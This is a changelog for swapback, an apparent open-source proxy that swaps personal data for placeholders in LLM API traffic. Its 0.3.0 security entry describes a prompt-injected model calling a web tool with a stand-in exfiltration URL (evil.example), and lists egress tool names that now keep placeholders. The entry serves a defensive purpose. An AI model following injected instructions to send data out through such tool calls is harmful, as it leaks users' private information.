# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project uses [Semantic Versioning](https://semver.org/).

## [0.3.0] - 2026-11-09

### Security
- **Tool calls that could send data out keep their placeholders.** Until now the real values were restored into every
  tool call's arguments, so a prompt-injected model could ask a web or shell tool to send them anywhere, e.g.
  `{"url": "https://evil.example/c?d=«EMAIL_1»"}`. A new restore policy, `tool_restore` in `swapback.yaml`, keeps
  placeholders for tools whose names look like network or shell egress (`web_fetch`, `WebFetch`, `Bash`,
  `exec_command`, `http_request`, `send_email`, `git_push`, ...) and for any call with a URL in its arguments. `allow`
  lists tools that always get real values, `deny` tools that never do, `default: keep` keeps placeholders everywhere
  except allowed tools, and `tool_restore: false` restores everything as before. Applied to plain JSON replies, OpenAI
  chat streams and Anthropic `tool_use` blocks and streams. A streamed call whose name does not decide is held until
  it is complete. Each kept call is counted as `tool_kept` in `requests.jsonl` (a count, never a value), and
  `swapback check-config` shows the policy. See the README's "Tool calls" section.
- The top-level `user` field is now scrubbed (it was skipped, with only a known-value check). `metadata`,
  `instructions`, `safety_identifier` and other free-text fields were already scrubbed; tests now cover them.

### Added
- `swapback known init` builds or extends `known.yaml` from a vCard export (2.1, 3.0, 4.0), a CSV (Google and Outlook
  contact exports, any name/email/phone/address columns, or value,type rows) and other known files. It merges without
  duplicates (case, spacing and phone formats), writes the file `0600`, skips one-word contacts that are relations or
  everyday words, and prints counts only (`--show` for values, `--dry-run` to write nothing). `--scan` reads past
  prompts (text or JSONL) and writes candidate names, emails and phones to a separate `known.suggestions.yaml` for
  review; suggestions are never merged on their own. Standard library only.

### Changed
- The "keep placeholders as written" system note now also reaches requests without a system message (a system message
  is added, but only when the request carries placeholders), a system or `developer` message with content parts,
  Anthropic's top-level `system` (string or blocks; a block is appended after any `cache_control` block) and the
  Responses API `instructions`. Before, it was only appended to a string system message.
- The proxy tells the scrubber which API a request is for (`/v1/messages` = Anthropic, `/v1/responses` = Responses)
  so the note goes in the right place.

### Upgrading
- If one of your egress-named tools must receive real values (your own mail tool, say), add it to
  `tool_restore.allow`. Otherwise it now receives placeholders.

## [0.2.1] - 2026-11-09

### Added
- `--help` (`-h`) and `--version` on both commands. `swapback-proxy --help` says what the proxy does, which config it
  reads (`SWAPBACK_CONFIG`, with the deprecated `PII_SCRUBBER_CONFIG` fallback), how to change the listen address
  (`SWAPBACK_LISTEN` or `listen:`), and points to `swapback check-config` and `swapback health`.
  `swapback COMMAND --help` describes each command.

### Changed
- README: a short "What it doesn't catch yet" list at the top of Limits, checked against this release (unlisted names,
  most date-of-birth forms, non-US national IDs, most non-US addresses, free-form secrets, Responses API streams).
- SECURITY.md: 0.2.x is the supported line, and reporters without the private-report button are asked to open an
  issue requesting a private contact, with no details.
- CI: `actions/checkout@v7` and `actions/setup-python@v7` (Node 24), so the runs no longer print the Node 20
  deprecation warning.

### Fixed
- `swapback-proxy --help`, or any other argument, started the proxy on 127.0.0.1:8787. Help and version now print and
  exit without loading the config or opening a port; an unknown option or argument prints the usage and exits with
  status 2. With no arguments the proxy starts as before.
- `swapback` with an unknown command printed the module notes and exited 0; it now prints the usage and an error and
  exits 2. `--help` no longer needs a loadable config.

## [0.2.0] - 2026-11-09

### Changed
- **Renamed from pii-scrubber to swapback.** The package is now `swapback` (`import swapback`), the commands are
  `swapback` and `swapback-proxy`, the environment variables are `SWAPBACK_*`, the config file is `swapback.yaml`
  (example: `swapback.example.yaml`), the default state directory is `~/.local/state/swapback`, and the repository is
  `github.com/rmpmrepo1278/swapback`. The old `PII_SCRUBBER_*` variables are still read as a fallback when the new one
  is unset (deprecated). Move an existing state directory by hand if you want to keep its vault. The `«PERSON_1»`
  placeholder format is unchanged. The 0.1.1 fixes below ship in this release.


### Fixed
- **Flaky proxy test (CI, Python 3.13).** The proxy tests picked two "free" ports by binding and releasing them, and the kernel can hand the same port back twice (4 in 100,000 tries on Linux). When the proxy's port equalled the mock upstream's, the proxy could not start and the test talked to the mock directly, which looked like a leak. Each test now gets its own mock upstream on a kernel-picked port with its own list of received requests, the proxy listens on port 0 and reports its port, and the fixture fails loudly unless the scrubber itself answers. The proxy code was not at fault; new tests pin every `/v1/completions` prompt shape (string, list, nested, token ids; streamed or not).
- **Anthropic Messages streams are restored.** `/v1/messages` SSE replies get their placeholders swapped back delta by
  delta (`text_delta`, and `input_json_delta` for `tool_use` input), including a placeholder split across deltas; held
  text is flushed before its `content_block_stop`. Before, agents in Anthropic mode showed `«PERSON_1»` in replies.
- **Written variants of a known value no longer leak.** A listed multi-word value is also matched when its words are
  joined by any whitespace run (non-breaking, repeated, tabs), zero-width characters, `.`, `_`, `-` or `%20`, and the
  post-swap egress re-check uses the same rule, so a variant that slips is blocked (`503`). Private terms use the same rule.
- **All-caps and other case variants are the same person.** Every variant of a listed value or private term shares one
  placeholder (before, `JANE DOE` became a second `«PERSON_n»`). The reply still gets back the exact form that was
  written, from a per-request record of surface forms (`Forms`).

### Added
- `evals/run_holdout.py` and a regression test: the patterns-only score on `evals/holdout3.json`, published in the
  README (10/42 positives in 0.1.0, 16/42 in 0.1.1; 22/22 negatives untouched; 64/64 exact round trips).
- Generic detection rules: emails written with bracketed at/dot (`name [at] example [dot] org`, `name(at)example.org`),
  with a full-width or small `@` or hidden zero-width characters; IPv6 addresses (validated, loopback skipped).
- README: setup for a real provider (copy the example files, set `private_terms_file`, edit `known.yaml` before
  starting, `upstream` is a base URL without `/v1`), "Use with agents" with a tested OpenClaw provider block, what a
  block looks like inside an agent, and how to check what the provider saw.

### Changed
- `evals/holdout3.json`: the one SSN-shaped value now uses the reserved 987-65-43xx range.

### Added (docs release)
- README rewrite: quickstart, architecture, configuration, comparison with similar projects, limits, security notes.
- Logo, banner, architecture and before/after graphics in `docs/assets/`.
- `examples/quickstart.yaml`, `examples/known.demo.yaml` and `examples/curl_demo.sh`.
- CONTRIBUTING, SECURITY, CODE_OF_CONDUCT, issue and pull request templates.
- GitHub Actions workflow running the tests and the smoke test on Python 3.11, 3.12 and 3.13.
- `evals/holdout3.json`: 64 synthetic detection cases.

## [0.1.0] - 2026-11-08

### Added
- OpenAI-compatible HTTP proxy (`swapback-proxy`) that swaps known values and detected PII for stable placeholders
  before a request leaves the machine and restores them in the reply: plain JSON, OpenAI chat-completion SSE streams and
  tool-call arguments.
- Known-values file with typed entries and written-variant matching; private terms and money figures.
- Detectors: `phonenumbers`, Microsoft Presidio predefined patterns, gitleaks default secret rules, local rules.
- Fail-closed behaviour: scrub errors, unreadable bodies and known values left after the swap answer `503`.
- File-path exemption for known names that are path segments.
- Local vault (mode 0600), counts-only request log, health endpoint, alert webhook, `canary` self-test, CLI.

### Fixed
- JSON request bodies are scrubbed whatever their `Content-Type`.
- Restored values are returned exactly as written (for example a phone number keeps its original format).
